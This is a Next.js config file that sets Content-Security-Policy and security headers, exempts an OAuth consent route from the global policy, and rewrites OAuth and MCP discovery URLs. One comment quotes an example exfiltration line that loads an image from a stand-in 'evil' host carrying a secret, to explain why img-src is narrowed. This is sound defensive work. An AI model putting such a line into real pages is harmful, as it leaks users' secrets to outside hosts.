import type { NextConfig } from "next";

// Second line of defence behind the escape-first markdown renderer: even if
// an XSS payload slipped through, it could not load external scripts or
// exfiltrate to another origin. 'unsafe-inline' script-src is required by
// Next's bootstrap scripts; styles are inline throughout the app; Google
// Fonts is the only external origin (see app/layout.tsx). The share page
// and the authorize form set their own, stricter CSP — browsers enforce
// every policy present, so the strictest one wins there.
// img-src is 'self' data: only, not https: — an open img-src lets injected
// markup exfiltrate data via new Image().src = 'https://evil/?x='+secret,
// which connect-src's 'self' does nothing to stop (image loads aren't
// fetch/XHR). The cost: note images hosted on other https domains won't load.
const CSP_DIRECTIVES = [
  "default-src 'self'",
  "script-src 'self' 'unsafe-inline'",
  "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
  "font-src 'self' https://fonts.gstatic.com",
  "img-src 'self' data:",
  "connect-src 'self'",
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
];

const CSP = CSP_DIRECTIVES.join('; ');

// The consent form is the one page whose whole purpose is to submit and then
// land the browser on ANOTHER origin — the client's OAuth callback. Chrome
// applies form-action across the redirect a submission produces, so
// "form-action 'self'" silently kills the last step of the flow: the button
// appears to do nothing. Measured live 2026-08-20, with a client whose
// callback was http://localhost:43231 — the authorization only completed on a
// ctrl-click, which opens a new context and escapes the check.
//
// Two CSP headers are enforced as an intersection, so the route cannot loosen
// this by sending its own — the global rule has to stop applying here, and
// /authorize sends a complete policy of its own instead (app/authorize),
// naming the one callback origin it has just validated rather than opening
// form-action up for everyone.

const nextConfig: NextConfig = {
  output: "standalone",
  // Next sends X-Powered-By: Next.js by default — free stack fingerprinting
  // for anyone probing the site, no request needed beyond the first one.
  poweredByHeader: false,
  async headers() {
    return [
      {
        source: '/authorize',
        headers: [
          // No Content-Security-Policy here on purpose: the route sends its
          // own, naming the single callback origin it has just validated.
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'X-Frame-Options', value: 'DENY' },
          { key: 'Referrer-Policy', value: 'no-referrer' },
        ],
      },
      {
        source: '/((?!authorize$).*)',
        headers: [
          { key: 'Content-Security-Policy', value: CSP },
          { key: 'X-Content-Type-Options', value: 'nosniff' },
          { key: 'X-Frame-Options', value: 'DENY' },
          // Share URLs carry the capability token in the path — never leak
          // it (or anything else) through the Referer header.
          { key: 'Referrer-Policy', value: 'no-referrer' },
        ],
      },
    ];
  },
  async rewrites() {
    return [
      {
        source: '/.well-known/oauth-authorization-server',
        destination: '/api/oauth/discovery',
      },
      // RFC 8414 §3.1: when the issuer carries a path, the metadata lives
      // under that path. Kybase's issuer is the bare origin, so the entry
      // above is the correct one — but clients that build the path-aware URL
      // from the MCP endpoint instead of from the issuer ask for this, and a
      // 404 here reads to them as "no authorization server at all".
      {
        source: '/.well-known/oauth-authorization-server/:path*',
        destination: '/api/oauth/discovery',
      },
      // RFC 9728: the document that tells a client which authorization server
      // this resource trusts. An MCP client looks for it before anything else.
      {
        source: '/.well-known/oauth-protected-resource',
        destination: '/api/oauth/protected-resource',
      },
      {
        source: '/.well-known/oauth-protected-resource/:path*',
        destination: '/api/oauth/protected-resource',
      },
    ];
  },
};

export default nextConfig;
